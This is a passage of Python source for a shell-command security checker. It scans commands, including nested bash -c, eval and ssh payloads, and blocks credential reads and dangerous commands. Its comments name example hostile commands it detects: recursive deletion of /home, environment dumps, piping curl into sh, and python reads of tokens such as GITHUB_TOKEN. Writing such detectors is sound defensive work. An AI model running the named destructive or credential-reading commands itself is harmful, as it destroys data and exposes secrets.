def _python_env_secret_hit(python_payloads: list[str]) -> bool:
    """True if any `python -c` payload reads a SECRET-SHAPED env var
    (``os.environ["…TOKEN…"]`` / ``os.getenv('…KEY…')`` …)."""
    return any(_PYTHON_ENV_SECRET.search(p) for p in python_payloads)


def check_command(cmd: str, _depth: int = 0) -> tuple[bool, str]:
    """Check a command string for security violations.

    Returns:
        (is_safe, reason) -- reason is empty if safe.
    """
    # v0.2.88 (FP-heredoc): build two scan surfaces from the ORIGINAL command
    # (newlines intact so here-doc boundaries survive), then normalize
    # whitespace for the flat-regex rules. The env-read rules run on the
    # env-read surface (inert literals stripped, `$VAR` kept); every other rule
    # runs on the skeleton (heredoc bodies + single-quoted contents stripped,
    # double-quoted literals kept). Falling back to the raw command would
    # re-open the FP class, so both surfaces are always used.
    skeleton = " ".join(_neutralize(cmd, env_read=False).split())
    env_surface = " ".join(_neutralize(cmd, env_read=True).split())

    for name, pattern, explanation in _RULES:
        surface = env_surface if name in _ENV_READ_RULES else skeleton
        if pattern.search(surface):
            reason = f"[{name}] {explanation}"
            if name in _CREDENTIAL_ACCESS_RULES:
                reason = f"{reason}\n{_REMEDIATION_HINT}"
            return False, reason

    # v0.2.88 (SCANNER-FP round-3, MC2/MC3): extract interpreter and python
    # payloads with a QUOTE-STATE-AWARE walk (not a raw-command regex), so a
    # payload named inside inert prose (a double-quoted commit message, a
    # here-doc body) is NEVER lifted out — that closes the two round-2 FPs while
    # the walk's full quote handling (no-space `-c'…'`, `$'…'`, `'\''` concat,
    # `ssh`/`su`/`ksh`) closes the nine round-2 FNs. One extraction feeds both
    # the shell-recursion and the python-secret check.
    shell_payloads, python_payloads = _extract_interp_payloads(cmd)

    # Recurse into interpreter `-c`/`eval` payloads. The quoted body of
    # `bash -c '…'` / `sh -c "…"` / `eval '…'` / `su -c '…'` / `ssh host '…'` is
    # EXECUTED as a SHELL command, so it must be scanned as its own command —
    # otherwise a single-quoted payload (blanked on the skeleton to keep FP prose
    # passing) would smuggle `rm -rf /home`, an env dump, or a curl|sh past every
    # rule. Depth-capped so a pathologically nested `bash -c 'bash -c "…"'` cannot
    # recurse without bound.
    if _depth < _MAX_INTERP_DEPTH:
        for payload in shell_payloads:
            if payload == cmd:
                continue  # defensive: never recurse on an identical string
            safe, reason = check_command(payload, _depth + 1)
            if not safe:
                return False, reason

    # A `python -c` one-liner that reads a secret-shaped env var
    # (`os.environ["GITHUB_TOKEN"]`, `os.getenv('OPENAI_API_KEY')`) is a direct
    # credential read — the shell rule set never sees the python-level env
    # access, so scan the payload for it explicitly. Benign python one-liners
    # (`print(1+1)`, JSON dumps, `os.environ["HOME"]`) carry no secret-shaped env
    # read and pass.
    if _python_env_secret_hit(python_payloads):
        return False, (
            "[python_env_secret] Reading a named secret env var from python "
            f"(use vct-secrets)\n{_REMEDIATION_HINT}"
        )

    return True, ""


def main() -> int:
    # Accept command from argument or stdin
    if len(sys.argv) > 1:
        cmd = " ".join(sys.argv[1:])
    else:
        cmd = sys.stdin.read()

    if not cmd.strip():
        return 0

    is_safe, reason = check_command(cmd)
    if not is_safe:
        print(f"BLOCKED: {reason}", file=sys.stderr)
        print(f"Command: {cmd.strip()[:120]}", file=sys.stderr)
        return 2

    return 0


if __name__ == "__main__":
    sys.exit(main())
